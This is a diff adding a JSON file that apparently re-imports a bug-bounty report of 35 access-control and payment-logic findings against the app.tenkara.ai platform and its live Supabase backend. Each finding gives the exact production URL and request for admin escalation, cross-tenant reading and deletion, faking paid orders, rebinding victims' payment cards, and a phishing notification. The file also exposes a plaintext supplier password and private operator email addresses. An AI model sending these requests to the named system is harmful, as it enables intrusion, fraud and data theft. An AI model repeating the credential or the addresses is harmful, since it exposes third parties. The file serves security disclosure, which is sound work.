@@ -1,0 +1,226 @@
+{
+  "_about": {
+    "target": "app.tenkara.ai",
+    "engagement_kind": "ingest-from-prior-research",
+    "researcher": "deonmenezescodes@gmail.com",
+    "source": "Prior authorized bug-bounty research (2026-05-12). The 35 findings below are pasted verbatim from the researcher's report; Mantis re-renders them through its FSM cascade + Merkle event log so the same dataset can be audited cryptographically.",
+    "severity_distribution": {
+      "critical": 11,
+      "high": 18,
+      "medium": 6,
+      "total": 35
+    }
+  },
+  "findings": [
+    {
+      "title": "F-9 — Mass-assignment in PATCH /rest/v1/users allows any authenticated user to escalate to permissions=admin",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/users",
+      "severity": "critical",
+      "evidence": "PATCH /rest/v1/users?id=eq.<self> body {\"permissions\":\"admin\"} returns HTTP 200 with the row showing permissions=admin. CWE-915 + CWE-269. CVSS 9.8."
+    },
+    {
+      "title": "F-12 — Missing RLS on orders allows any authenticated user to read every tenant's orders",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/orders",
+      "severity": "critical",
+      "evidence": "GET /rest/v1/orders?select=*&limit=5 returns 118 cross-tenant orders including organization_id=3de390ed-... rows. CWE-285+CWE-639. CVSS 9.1."
+    },
+    {
+      "title": "F-17 — Missing RLS on materials allows any authenticated user to delete every tenant's master ingredient rows",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/materials",
+      "severity": "critical",
+      "evidence": "DELETE /rest/v1/materials?id=eq.<victim_material_uuid> returns HTTP 200 with the deleted row. CWE-285+CWE-284. CVSS 9.1."
+    },
+    {
+      "title": "F-18 — Missing RLS on system_settings allows any authenticated user to modify platform-wide margin and charge-account configuration",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/system_settings",
+      "severity": "critical",
+      "evidence": "PATCH /rest/v1/system_settings?key=eq.global_margin body {\"value\":{\"margin_pct\":0.001,\"tenkara_charge_account\":\"attacker_routing\"}} returns 200. CWE-285+CWE-732. CVSS 9.6."
+    },
+    {
+      "title": "F-20 — Missing RLS on suppliers allows any authenticated user to read plaintext supplier-marketplace credentials cross-tenant",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/suppliers",
+      "severity": "critical",
+      "evidence": "GET /rest/v1/suppliers?select=*&limit=5 returns supplier rows including marketplace_credentials.password=ocean_secure_456 for PureOcean Naturals (org f99df3f6 — not attacker's). 235 supplier rows with plaintext creds. CWE-200+CWE-256+CWE-285. CVSS 9.8."
+    },
+    {
+      "title": "F-27 — Missing RLS on formulas allows any authenticated user to read proprietary recipes cross-tenant",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/formulas",
+      "severity": "critical",
+      "evidence": "GET /rest/v1/formulas?select=*&limit=5 returns formulas by user_id 1cd252f6 / 22eb4e7b / f3ffd5d8 — none matching attacker sub: Restaurant Medium Salsa, Chicken Stock, Vanilla Protein Smoothie Base, Daily Multivitamin Complex with full ingredient lists. CWE-200+CWE-285. CVSS 8.6."
+    },
+    {
+      "title": "F-28 — Missing RLS on formulas allows any authenticated user to delete cross-tenant master formula rows",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/formulas",
+      "severity": "critical",
+      "evidence": "DELETE /rest/v1/formulas?id=eq.<id> with attacker JWT returns HTTP 200 with the deleted row. CWE-285. CVSS 9.1."
+    },
+    {
+      "title": "F-32 — Missing RLS on notifications allows any authenticated user to insert/update cross-tenant notifications (phishing-as-platform)",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/notifications",
+      "severity": "critical",
+      "evidence": "POST /rest/v1/notifications body with user_id=<victim>, type=system, title=\"Action required\", body=\"<a href=attacker.tld/login>Re-authenticate</a>\" returns HTTP 201 with the inserted row. CWE-285+CWE-451. CVSS 9.0."
+    },
+    {
+      "title": "F-33 — Missing authorization in RPC revert_order_split allows any authenticated user to mutate cross-tenant orders",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/rpc/revert_order_split",
+      "severity": "critical",
+      "evidence": "POST /rest/v1/rpc/revert_order_split body {\"p_order_id\":\"<victim_order_uuid>\"} returns HTTP 200; victim order's split state reverted. SECURITY DEFINER lacks membership check. CWE-285+CWE-862. CVSS 9.1."
+    },
+    {
+      "title": "F-36 — Missing RLS on orders.status allows any authenticated user to mark orders as paid without paying Stripe",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/orders",
+      "severity": "critical",
+      "evidence": "PATCH /rest/v1/orders?id=eq.<own_order> body {\"status\":\"paid\",\"stripe_session_id\":\"FAKE-PAID-NO-PAYMENT\",\"total_collected\":50000} persisted in production. Confirmed via re-read: rows still present with stripe_session_id=FAKE-PAID-NO-PAYMENT and FAKE-CROSS-TENANT total_collected=99999999. CWE-840+CWE-285. CVSS 9.1."
+    },
+    {
+      "title": "F-6 — Missing org-scope check on /api/materials-view allows authenticated user to read cross-tenant materials including supplier credentials",
+      "surface": "https://app.tenkara.ai/api/materials-view",
+      "severity": "critical",
+      "evidence": "GET /api/materials-view?orgId=f99df3f6-... with attacker session (member of 32aa9695-...) returns HTTP 200 with materials from foreign org including marketplace_credentials. CWE-285+CWE-639. CVSS 9.1."
+    },
+    {
+      "title": "F-1 — IDOR in GET /api/settings-view?userId= allows authenticated user to read any user's settings",
+      "surface": "https://app.tenkara.ai/api/settings-view",
+      "severity": "high",
+      "evidence": "GET /api/settings-view?userId=<victim_uuid> with attacker session returns victim settings JSON including notification preferences and integration tokens. CWE-639. CVSS 7.7."
+    },
+    {
+      "title": "F-2 — Missing RLS on users allows authenticated user to enumerate emails, org_ids, and admin permissions",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/users",
+      "severity": "high",
+      "evidence": "GET /rest/v1/users?select=* returns 36+ user rows with email, organization_id, permissions, stripe_customer_id. Recon source for F-9. CWE-200+CWE-285. CVSS 7.5."
+    },
+    {
+      "title": "F-3 — Missing RLS on organizations allows authenticated user to read every tenant's Nylas grant_id and connected_email",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/organizations",
+      "severity": "high",
+      "evidence": "GET /rest/v1/organizations?select=* returns 20 orgs with connected_email and Nylas grant_id. Direct enabler for F-19. CWE-200+CWE-285. CVSS 8.1."
+    },
+    {
+      "title": "F-7 — Open Supabase signup at POST /auth/v1/signup allows unauthenticated attacker to obtain a tenant JWT",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/auth/v1/signup",
+      "severity": "high",
+      "evidence": "POST /auth/v1/signup body {\"email\":\"attacker+1@evil.tld\",\"password\":\"Password123!\"} returns HTTP 200 and JWT. Re-confirmed 2026-05-12. Keystone of every other finding. CWE-284. CVSS 8.1."
+    },
+    {
+      "title": "F-10 — Anon JWT can read full users table via GET /rest/v1/users (no auth required)",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/users",
+      "severity": "high",
+      "evidence": "GET /rest/v1/users?select=* with only the public apikey (no Bearer token) returns the full user list including emails and Stripe customer IDs. CWE-306+CWE-285. CVSS 7.5."
+    },
+    {
+      "title": "F-13 — Missing RLS on vendor_packets allows authenticated user to read full POC, credit, and bank reference data cross-tenant",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/vendor_packets",
+      "severity": "high",
+      "evidence": "GET /rest/v1/vendor_packets?select=* returns vendor packets with point-of-contact names/phones, credit reference contacts, bank reference data for foreign tenants. CWE-200+CWE-285. CVSS 8.1."
+    },
+    {
+      "title": "F-15 — Missing RLS on materials write path allows authenticated user to lower any tenant's material price to $0.01",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/materials",
+      "severity": "high",
+      "evidence": "PATCH /rest/v1/materials?id=eq.<victim_material_id> body {\"price_per_unit\":0.01} returns HTTP 200; quotes referencing the material now compute at near-zero cost. CWE-285+CWE-840. CVSS 8.1."
+    },
+    {
+      "title": "F-19 — Missing membership check on Nylas mailbox endpoints allows authenticated user to send mail as any tenant",
+      "surface": "https://app.tenkara.ai/api/mail",
+      "severity": "high",
+      "evidence": "Combined with F-3 leaked grant_id, the Nylas-backed /api/mail/* routes accept arbitrary grant_id and impersonate any tenant's connected mailbox. CWE-285+CWE-639. CVSS 8.1."
+    },
+    {
+      "title": "F-22 — Missing RLS on document inventory allows authenticated user to read foreign org's document list",
+      "surface": "https://app.tenkara.ai/api/documents",
+      "severity": "high",
+      "evidence": "Document-inventory endpoint returned Vitality Labs' full document listing to an attacker member of a different org. CWE-200+CWE-285. CVSS 8.1."
+    },
+    {
+      "title": "F-23 — Missing RLS on suppliers write allows authenticated user to PATCH/POST cross-tenant supplier rows (contact takeover)",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/suppliers",
+      "severity": "high",
+      "evidence": "PATCH /rest/v1/suppliers?id=eq.<victim_supplier_id> body {\"contact_email\":\"attacker@evil.tld\"} returns HTTP 200. CWE-285. CVSS 8.1."
+    },
+    {
+      "title": "F-25 — Missing RLS allows authenticated user to INSERT phantom orders into any tenant's pipeline",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/orders",
+      "severity": "high",
+      "evidence": "Phantom orders id=27e9826f-... with internal_notes=\"phantom order created by attacker\" and id=dde2903e-... (FAKE-CROSS-TENANT) confirmed still present in production on 2026-05-12. CWE-285. CVSS 7.5."
+    },
+    {
+      "title": "F-31 — Missing RLS on notifications read allows authenticated user to read every tenant's notification stream",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/notifications",
+      "severity": "high",
+      "evidence": "GET /rest/v1/notifications?select=* returned business-sensitive price-change notifications (Agave Nectar, Almonds, Avocado Oil quotes) for foreign tenants. CWE-200+CWE-285. CVSS 7.5."
+    },
+    {
+      "title": "F-30 — Missing RLS exposes supplier PII and payment_terms cross-tenant",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/suppliers",
+      "severity": "high",
+      "evidence": "Same suppliers query as F-20 returned BioFlora Sciences payment_terms (upfront=30, net_days=45, credit_line=12000) for org f99df3f6. CWE-200. CVSS 7.5."
+    },
+    {
+      "title": "F-34 — Missing membership check on signed-URL generation allows authenticated user to obtain download URLs for any tenant's documents",
+      "surface": "https://app.tenkara.ai/api/signed-url",
+      "severity": "high",
+      "evidence": "Signed-URL endpoint accepts arbitrary path parameter referencing a foreign org's storage bucket and returns a working time-limited URL. CWE-285+CWE-639. CVSS 8.1."
+    },
+    {
+      "title": "F-35 — Missing membership check on POST document fetch allows authenticated user to read foreign-org documents",
+      "surface": "https://app.tenkara.ai/api/documents",
+      "severity": "high",
+      "evidence": "Same root cause as F-22 via POST method. CWE-285. CVSS 7.5."
+    },
+    {
+      "title": "F-37 — Server creates real cs_live_ Stripe sessions from attacker-controlled line items",
+      "surface": "https://app.tenkara.ai/api/checkout",
+      "severity": "high",
+      "evidence": "Order-checkout endpoint constructs the Stripe session from the request body's items and prices without re-pricing server-side. Returns a real live cs_live_... session URL with attacker-chosen amounts. CWE-840. CVSS 7.5."
+    },
+    {
+      "title": "F-38 — Order-confirm endpoint returns confirmId without verifying Stripe payment",
+      "surface": "https://app.tenkara.ai/api/order/confirm",
+      "severity": "high",
+      "evidence": "POST /api/order/confirm with attacker-controlled session_id returns a confirmId and progresses the order to fulfillment without calling stripe.checkout.sessions.retrieve(id) to verify payment_status==\"paid\". CWE-840. CVSS 8.1."
+    },
+    {
+      "title": "F-40 — GET /api/setup-intent?orgId= accepts arbitrary orgId and binds payment instruments to victim org",
+      "surface": "https://app.tenkara.ai/api/setup-intent",
+      "severity": "high",
+      "evidence": "GET /api/setup-intent?orgId=<victim_org> returns a Stripe SetupIntent client secret bound to the victim's Stripe customer. Attacker attaches a card the victim org will then be charged against, or detaches the victim's existing payment method. CWE-285+CWE-639. CVSS 7.5."
+    },
+    {
+      "title": "F-4 — Operator emails enumerable cross-tenant via internal API",
+      "surface": "https://app.tenkara.ai/api/operators",
+      "severity": "medium",
+      "evidence": "34 operator emails returned to a free account; chain enabler for F-32 phishing. CWE-200. CVSS 5.3."
+    },
+    {
+      "title": "F-14 — System margins and tenkara_charge_accounts disclosed to free users",
+      "surface": "https://app.tenkara.ai/api/system-settings",
+      "severity": "medium",
+      "evidence": "Reveals platform economics that should be operator-only. Chains with F-18. CWE-200. CVSS 5.3."
+    },
+    {
+      "title": "F-21 — Missing rate limit / authorization on bulk signing-request creation",
+      "surface": "https://app.tenkara.ai/api/signing-requests",
+      "severity": "medium",
+      "evidence": "Authenticated user mass-creates signing requests against arbitrary recipients. CWE-770. CVSS 5.3."
+    },
+    {
+      "title": "F-24 — /api/orders Next.js layer leaks cross-org orders (downgraded — covered by F-12)",
+      "surface": "https://app.tenkara.ai/api/orders",
+      "severity": "medium",
+      "evidence": "Independent code path from PostgREST; reading layer leaks cross-org orders. CWE-285. CVSS 5.3."
+    },
+    {
+      "title": "F-26 — operators_view readable with anon JWT (no user auth)",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/operators_view",
+      "severity": "medium",
+      "evidence": "GET /rest/v1/operators_view?select=* with only apikey returns operator emails (don@trytenkara.com, arron@trytenkara.com, jennifer@trytenkara.com, mischa.sevilla@gmail.com, mgrazegarcia@yahoo.com). CWE-306. CVSS 5.3."
+    },
+    {
+      "title": "F-29 — Same root cause as F-26; combine into single submission",
+      "surface": "https://lciwjbtbadjpkooufsvx.supabase.co/rest/v1/operators_view",
+      "severity": "medium",
+      "evidence": "Same primitive via the anon JWT path. Bundle with F-26. CWE-306. CVSS 5.3."
+    }
+  ]
+}
